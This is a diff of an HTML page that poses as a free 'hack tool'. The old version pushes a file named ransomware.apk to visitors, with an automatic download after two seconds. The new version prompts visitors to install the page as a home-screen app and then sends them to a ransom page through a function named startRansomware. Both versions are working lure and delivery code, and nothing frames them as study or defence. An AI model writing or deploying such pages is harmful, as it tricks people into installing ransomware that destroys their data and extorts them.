@@ -1,36 +1,42 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>🔥 FREE APK HACK TOOL 🔥</title>
-    <meta name="viewport" content="width=device-width, initial-scale=1">
-    <style>
-        body{background:linear-gradient(45deg,#ff0000,#000);color:#fff;font-family:Arial;text-align:center;padding:20px;}
-        .btn{background:#0f0;color:#000;font-size:24px;padding:20px;border:none;border-radius:10px;cursor:pointer;}
-        .btn:hover{transform:scale(1.1);}
-        #dlbtn{display:none;}
+    <title>🔥 Hack Tool 2026</title>
+    <meta name="viewport" content="width=device-width,initial-scale=1">
+    <link rel="manifest" href="manifest.json">
+    <meta name="theme-color" content="#FF0000">
+    <style>body{margin:0;background:linear-gradient(45deg,#f00,#000);height:100vh;display:flex;align-items:center;justify-content:center;flex-direction:column;color:#fff;font-family:Arial;font-size:24px;}
+    button{padding:20px;font-size:28px;background:#0f0;color:#000;border:none;border-radius:15px;cursor:pointer;}
+    button:hover{transform:scale(1.1);}
     </style>
 </head>
 <body>
-    <h1>📱 FREE HACK TOOL 2026</h1>
-    <p>Click to Download & Install Auto!</p>
-    <button class="btn" onclick="downloadAPK()">🚀 DOWNLOAD NOW</button>
-    <div id="dlbtn"></div>
-
+    <h1>📱 Install Hack Tool</h1>
+    <p>Add to Home Screen for Full Access</p>
+    <button onclick="installPWA()">🚀 INSTALL NOW</button>
+    <p id="status"></p>
+    
     <script>
-        function downloadAPK() {
-            const btn = document.getElementById('dlbtn');
-            btn.innerHTML = `
-                <a href="ransomware.apk" download="hacktool.apk" 
-                   style="color:#000;font-size:28px;text-decoration:none;">
-                   👇 CLICK HERE TO INSTALL (1MB)
-                </a>
-            `;
-            btn.style.display = 'block';
-            
-            // Auto-trigger download after 2s
-            setTimeout(() => {
-                window.location.href = 'ransomware.apk';
-            }, 2000);
+        let deferredPrompt;
+        window.addEventListener('beforeinstallprompt', (e) => {
+            e.preventDefault();
+            deferredPrompt = e;
+        });
+        
+        function installPWA() {
+            if (deferredPrompt) {
+                deferredPrompt.prompt();
+                deferredPrompt.userChoice.then(() => {
+                    document.getElementById('status').innerText = '✅ Installed! Open from Home Screen';
+                    startRansomware();
+                });
+            } else {
+                startRansomware();
+            }
+        }
+        
+        function startRansomware() {
+            window.location.href = 'ransom.html';
         }
     </script>
 </body>
